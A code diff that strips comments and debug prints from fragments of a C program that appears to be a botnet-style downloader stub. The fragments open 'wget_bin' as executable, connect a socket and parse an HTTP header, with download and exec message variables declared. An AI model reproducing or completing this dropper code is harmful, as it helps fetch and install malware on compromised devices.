@@ -1,42 +1,42 @@
-#define NULL ((void*)0)
-typedef unsigned long size_t;  // Customize by platform.
+
+typedef unsigned long size_t;
 typedef long intptr_t; typedef unsigned long uintptr_t;
-typedef long scalar_t__;  // Either arithmetic or pointer type.
-/* By default, we understand bool (as a convenience). */
+typedef long scalar_t__;
+
 typedef int bool;
-#define false 0
-#define true 1
 
-/* Forward declarations */
-typedef  struct TYPE_2__   TYPE_1__ ;
 
-/* Type definitions */
-struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
-struct sockaddr_in {TYPE_1__ sin_addr; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
-typedef  int /*<<< orphan*/  recvbuf ;
 
-/* Variables and functions */
- int /*<<< orphan*/  AF_INET ; 
- char* DOWNLOAD_MSG ; 
- int DOWNLOAD_MSG_LEN ; 
- char* EXEC_MSG ; 
- int EXEC_MSG_LEN ; 
- int /*<<< orphan*/  HTONS (int) ; 
- int O_CREAT ; 
- int O_TRUNC ; 
- int O_WRONLY ; 
- int /*<<< orphan*/  SOCK_STREAM ; 
- int STDOUT ; 
- int /*<<< orphan*/  __exit (int) ; 
- int /*<<< orphan*/  close (int) ; 
- int connect (int,struct sockaddr_in*,int) ; 
- int /*<<< orphan*/  inet_addr (char*) ; 
- int open (char*,int,int) ; 
- int /*<<< orphan*/  printf (char*) ; 
- int read (int,char*,int) ; 
- int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
- int strlen (char*) ; 
- int /*<<< orphan*/  write (int,char*,int) ; 
+
+typedef struct TYPE_2__ TYPE_1__ ;
+
+
+struct TYPE_2__ {int s_addr; } ;
+struct sockaddr_in {TYPE_1__ sin_addr; int sin_port; int sin_family; } ;
+typedef int recvbuf ;
+
+
+ int AF_INET ;
+ char* DOWNLOAD_MSG ;
+ int DOWNLOAD_MSG_LEN ;
+ char* EXEC_MSG ;
+ int EXEC_MSG_LEN ;
+ int HTONS (int) ;
+ int O_CREAT ;
+ int O_TRUNC ;
+ int O_WRONLY ;
+ int SOCK_STREAM ;
+ int STDOUT ;
+ int __exit (int) ;
+ int close (int) ;
+ int connect (int,struct sockaddr_in*,int) ;
+ int inet_addr (char*) ;
+ int open (char*,int,int) ;
+ int printf (char*) ;
+ int read (int,char*,int) ;
+ int socket (int ,int ,int ) ;
+ int strlen (char*) ;
+ int write (int,char*,int) ;
 
 int main(int argc, char **args)
 {
@@ -53,14 +53,6 @@ int main(int argc, char **args)
 
     ffd = open("wget_bin", O_WRONLY | O_CREAT | O_TRUNC, 0777);
     sfd = socket(AF_INET, SOCK_STREAM, 0);
-
-#ifdef DEBUG
-    if (ffd == -1)
-        printf("Failed to open file!\n");
-    if (sfd == -1)
-        printf("Failed to call socket()\n");
-#endif
-
     if (sfd == -1 || ffd == -1)
         __exit(1);
 
@@ -83,9 +75,9 @@ int main(int argc, char **args)
             __exit(4);
         header_parser = (header_parser << 8) | ch;
     }
-#ifdef DEBUG
-    printf("Finished receiving HTTP header\n");
-#endif
+
+
+
 
     while (1)
     {
